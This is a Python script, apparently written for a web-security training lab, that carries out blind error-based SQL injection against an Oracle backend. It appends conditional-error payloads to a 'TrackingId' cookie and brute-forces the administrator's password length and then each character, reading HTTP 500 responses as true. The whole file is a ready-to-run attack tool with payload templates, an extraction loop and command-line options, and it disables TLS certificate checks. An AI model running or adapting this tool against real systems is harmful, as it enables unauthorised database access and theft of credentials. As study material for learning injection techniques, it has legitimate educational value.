#!/usr/bin/env python3

import requests
from sys import argv
from urllib import parse
import urllib3 
import string


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



'''
	find length payload  || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19 ) ||'      
    find string payload  || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,1,1)='w' ) ||'

	if 500 : means that it's true
	if 200 : not the password 

    


'''


# ================================= Class ================================= #

class Request():
	crakPayload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,{indexOfletter},1)='{letter}' ) || '"
	LengthPayload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)={passLength} ) || '"

	BinarySearchLengthPayload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password){operator}{PasswordValue} ) ||"
	BinarySearchCrakPayload = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and SUBSTR(password,{indexOfletter},1){operator}'{PasswordValue}' ) ||"

	Wordlist = string.ascii_letters + string.digits
	
	def __init__(self, TargetUrl, proxies=None, cookies=None, lengthPayload=LengthPayload, crackPayload=crakPayload  ):
		self.TargetUrl = TargetUrl
		self.proxies = proxies
		self.cookies = cookies
		self.crakPayload = crackPayload
		self.LengthPayload = lengthPayload
		
	
	# return list [ text of respone , status coe ]
	# defualt value their is no cookies or proxies
	def sendRequest(self):
		try:
			result = requests.get(self.TargetUrl ,  proxies=self.proxies , cookies=self.cookies , verify=False )
			return [result.text, result.status_code]
		except:
			print("Error geting the request to ",self.TargetUrl)

	# search for word in response 
	def checkResponse(self , responseResult , word):
		if responseResult[1] == 200 :
			if word in responseResult[0]:
				#print("Found {0}".format(word))
				return True
			else:
				return False
		else:
			print("response code is: ",responseResult[1]) # print the response code if the respons is not 200

	# Url encode the payload 
	def encodePayload(self, payload):
		return parse.quote(payload)

	# normal brute force to find the password length
	def BruteForceFindLength(self, infectedCookieParameter, payload=LengthPayload, maxLength=50):
		# Get the correct cookie value
		infectedCookieValue = self.cookies.get(infectedCookieParameter , "")
		for i in range(1,maxLength+1): #  no zero password length , add 1 to reach the max pass length
			encodedPayload = self.encodePayload( payload.format(passLength=i) ) # test if pass length is equal to i
			self.cookies[infectedCookieParameter] = infectedCookieValue + encodedPayload #Edit the cookie to have the payload
			responseResult = self.sendRequest()

			if responseResult[1] != 200 :
				print("Password Length is: ",i)
				return i
			else:
				print("Trying ",i,end="\r")
				


	def BruteForcePassword(self, passwordLength, infectedCookieParameter,  wordlist=Wordlist, payload=crakPayload ):
		crackedPasswod = []
		# Get the correct cookie value
		infectedCookieValue = self.cookies.get(infectedCookieParameter , "")
		for i in range(1,passwordLength+1): # To crack the last index
			for passValue in wordlist:
				# Edit the value of the cookie to set the payload in it
				encodedPayload = self.encodePayload( payload.format(indexOfletter=i,letter=passValue) ) # test if pass length is equal to i
				self.cookies[infectedCookieParameter] = infectedCookieValue + encodedPayload #Edit the cookie to have the payload
				responseResult = self.sendRequest()

				# Check if it has the welcome basck word
				if responseResult[1] != 200:
					crackedPasswod.append(passValue)
					print("Index ",i,"is: ",passValue)
					break
				else:
					print("Trying ",passValue,end="\r")
		else:
			password = "".join(str(i) for i in crackedPasswod)
			return password

	

# ================================= Class ================================= #




# ================================= Main ================================= #


if __name__ == '__main__' :

	help="Traget Url + options\n\n-binaryLength [ expected passLength ] \n-binaryCrack [passLength]\n-length [ Password Length ] To BruteForce Finding password length\n-crack [ password length ] edit the wordlist if you want"
	# You Must change it manually
	SiteCookies = {'TrackingId': 'RMiQKy9Qt1Xz08Vy' , 'session':'lrmZkJdpRjnWuEoHOJlHbQYUDZE6BCct'}
	#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
	numberOfArguments = len(argv)
	if numberOfArguments == 4: # start the script only if all argv are there 
		TargetUrl=argv[1]
	else:
		print(help)
		exit()
	
	targetSite = Request(TargetUrl=TargetUrl,cookies=SiteCookies)
	
	if argv[2] == "-length":
		Maxlength= int(argv[3]) # take the max password length 
		targetSite.BruteForceFindLength(infectedCookieParameter="TrackingId" ,maxLength=Maxlength)
	elif argv[2] == "-crack":
		PasswordLength = int(argv[3])
		Wordlist = string.ascii_letters + string.digits
		password = targetSite.BruteForcePassword(passwordLength=PasswordLength, infectedCookieParameter="TrackingId" , wordlist=Wordlist)
		print(password)
	else:
		print(help)
	